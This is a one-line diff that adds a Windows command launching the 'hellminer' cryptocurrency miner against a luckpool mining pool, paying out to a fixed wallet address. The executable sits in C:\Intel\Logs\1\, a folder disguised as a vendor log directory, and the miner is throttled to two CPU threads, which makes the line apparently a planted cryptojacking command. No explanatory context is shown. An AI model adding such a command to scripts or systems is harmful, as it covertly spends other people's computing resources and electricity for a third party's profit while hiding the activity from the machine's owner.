@@ -1,0 +1,1 @@
+C:\Intel\Logs\1\hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RNqEUU7ujcyjiSoe1Z48cAin55pA3VSWEw.Miner -p x --cpu 2
